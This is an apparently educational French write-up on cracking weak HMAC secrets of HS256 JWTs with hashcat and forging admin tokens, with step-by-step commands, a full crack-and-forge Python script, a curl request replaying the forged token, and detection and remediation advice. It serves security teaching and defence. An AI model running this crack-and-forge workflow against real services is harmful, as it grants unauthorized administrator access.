# 🔓 Cracking de secret HMAC sur JWT

> **Auteur :** [@spectramz](https://github.com/exploit4040) — *"Le roi des pirates"* 🏴‍☠️
> **Catégorie :** Web Exploitation — Cryptographie
> **Difficulté :** ⭐⭐☆☆☆
> **Tags :** `jwt`, `hmac`, `hashcat`, `brute-force`, `hs256`, `hs512`

---

##  Table des matières

- [Contexte](#-contexte)
- [Principe de l'attaque](#-principe-de-lattaque)
- [Prérequis](#-prérequis)
- [Exploitation pas à pas](#-exploitation-pas-à-pas)
- [Script Python automatisé](#-script-python-automatisé)
- [Détection](#-détection)
- [Remédiation](#-remédiation)
- [Références](#-références)

---

##  Contexte

Les JWT signés avec un algorithme **symétrique** (HS256, HS384, HS512) utilisent un **secret partagé** entre le serveur et le client pour signer et vérifier les tokens. Si ce secret est faible, il peut être retrouvé par **force brute hors ligne**, ce qui permet de forger des tokens arbitraires.

Cette attaque est l'une des plus courantes car de nombreux développeurs utilisent des secrets triviaux (`secret`, `123456`, `changeme`, `password`…) ou des mots du dictionnaire.

---

## 🧠 Principe de l'attaque

Un JWT HS256 est signé avec :


signature = HMAC-SHA256(
base64url(header) + "." + base64url(payload),
secret
)
text


Le calcul de la signature est **déterministe** : si on connaît le token et qu'on teste un secret, on peut recalculer la signature et comparer. C'est donc une attaque par **force brute offline** :

1. On récupère un token valide
2. On essaie chaque mot d'un dictionnaire comme secret
3. On recalcule la signature
4. Si elle correspond → secret trouvé

**Avantage** : c'est très rapide (des millions de tests par seconde).

---

##  Prérequis

- **Un JWT valide** signé en HS256/384/512
- **hashcat** installé (`apt install hashcat`)
- **Une wordlist** (`rockyou.txt`, SecLists…)
- **Un CPU/GPU** correct (optionnel mais recommandé)

---

##  Exploitation pas à pas

### Étape 1 — Récupérer un token

**Via le navigateur** :

1. Ouvrir les DevTools (F12)
2. Onglet **Application** → **Cookies** ou **Local Storage**
3. Copier la valeur du token

**Via `curl`** :

```bash
curl -X POST http://<cible>/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' \
  -i

Via Burp Suite :

    Intercepter une requête authentifiée

    Repérer l'en-tête Authorization: Bearer <token> ou le cookie de session

Étape 2 — Identifier l'algorithme

Décoder le header en base64url :
bash

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

Résultat :
json

{"alg":"HS256","typ":"JWT"}

Si l'algorithme est HS256, HS384 ou HS512 → cette attaque s'applique.
Étape 3 — Préparer le fichier de hash
bash

echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE" > token.txt

Étape 4 — Lancer hashcat
bash

hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt

Options :
Option	Signification
-a 0	Attaque par dictionnaire
-m 16500	Mode JWT (détecte HS256/384/512)
token.txt	Fichier contenant le JWT
rockyou.txt	Wordlist

Sortie attendue :
text

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE:secret123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiJ9...
Time.Started.....: ...
Time.Estimated...: ...
Recovered........: 1/1 (100.00%) Digests

Afficher le résultat après coup :
bash

hashcat -a 0 -m 16500 token.txt rockyou.txt --show

Étape 5 — Forger un nouveau token

Une fois le secret connu, on forge un token avec des privilèges élevés.

Avec Python (PyJWT) :
python

import jwt

SECRET = "secret123"

# Payload admin
payload = {
    "username": "admin",
    "role": "admin",
    "admin": True
}

# Forge
forged = jwt.encode(payload, SECRET, algorithm="HS256")
print(forged)

Avec jwt.io :

    Coller le token original

    Modifier le payload ("role": "admin")

    Saisir le secret dans le champ "Verify Signature"

    Copier le nouveau token

Avec un script shell :
bash

# Utilise openssl pour signer manuellement
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64url)
PAYLOAD=$(echo -n '{"username":"admin","role":"admin"}' | base64url)
SIGNATURE=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64url)
echo "$HEADER.$PAYLOAD.$SIGNATURE"

Étape 6 — Utiliser le token forgé
bash

curl http://<cible>/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"

🤖 Script Python automatisé
python

#!/usr/bin/env python3
"""
Cracking + forge de JWT HS256.
Auteur : SpectraMz
"""
import jwt
import subprocess
import sys
import os

def crack_secret(token: str, wordlist: str) -> str:
    """Crack le secret HMAC avec hashcat."""
    with open("token.txt", "w") as f:
        f.write(token)

    print(f"[*] Cracking avec {wordlist}...")
    result = subprocess.run(
        ["hashcat", "-a", "0", "-m", "16500", "token.txt", wordlist, "--quiet"],
        capture_output=True, text=True
    )

    # Récupérer le résultat
    result = subprocess.run(
        ["hashcat", "-a", "0", "-m", "16500", "token.txt", wordlist, "--show"],
        capture_output=True, text=True
    )

    if ":" in result.stdout:
        secret = result.stdout.strip().split(":")[-1]
        print(f"[+] Secret trouvé : {secret}")
        return secret
    else:
        print("[-] Secret non trouvé")
        return None

def forge_token(secret: str, payload: dict, algo: str = "HS256") -> str:
    """Forge un nouveau token."""
    forged = jwt.encode(payload, secret, algorithm=algo)
    print(f"[+] Token forgé : {forged[:80]}...")
    return forged

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <JWT> <WORDLIST>")
        sys.exit(1)

    token = sys.argv[1]
    wordlist = sys.argv[2]

    secret = crack_secret(token, wordlist)
    if secret:
        forged = forge_token(secret, {"username": "admin", "role": "admin"})
        print(f"\n[+] Token final :\n{forged}")

Utilisation :
bash

python3 crack_jwt.py "eyJhbGciOiJIUzI1NiJ9..." /usr/share/wordlists/rockyou.txt

🔍 Détection
Côté défensif (logs)

    Surveiller les tentatives d'authentification échouées avec des tokens modifiés

    Détecter les tokens dont la signature ne correspond pas à l'utilisateur attendu

    Alerter sur les claims inhabituels (role: admin par un utilisateur normal)

Côté attaquant

    Vérifier que le token est bien HS256/384/512

    Tester plusieurs wordlists (rockyou, SecLists, listes personnalisées)

    Utiliser --rule avec hashcat pour les mutations (secret → Secret123!)

🛡️ Remédiation
Règles pour une clé HMAC robuste
Règle	Exemple
256 bits minimum	secrets.token_hex(32) → 64 caractères
Aléatoire	Générée par CSPRNG, jamais devinée
Jamais dans le code	Variable d'environnement ou coffre-fort
Rotation périodique	Tous les 90 jours
Unique par environnement	Dev ≠ Staging ≠ Prod
Code sécurisé (Python)
python

import secrets
import jwt

# lé robuste
SECRET_KEY = secrets.token_hex(32)  # 256 bits

# Ou chargée depuis l'environnement
import os
SECRET_KEY = os.environ["JWT_SECRET"]

Code vulnérable (à ne pas faire)
python

# ❌ Clé faible hardcodée
SECRET_KEY = "secret"

# ❌ Clé devinable
SECRET_KEY = "changeme"

# ❌ Clé courte
SECRET_KEY = "abc123"

Utiliser un algorithme asymétrique

Pour éviter complètement le problème, utiliser RS256 ou ES256 avec une paire de clés :
python

# RS256 : clé privée pour signer, clé publique pour vérifier
with open("private.pem") as f:
    private_key = f.read()

token = jwt.encode(payload, private_key, algorithm="RS256")

📚 Références

    RFC 7519 — JSON Web Token

    hashcat — Mode 16500 JWT

    OWASP — JWT Cheat Sheet

    PortSwigger — JWT Attacks

<p align="center"> <b>🏴‍☠️ SpectraMz — Stay Curious, Hack Ethically</b> </p> ```
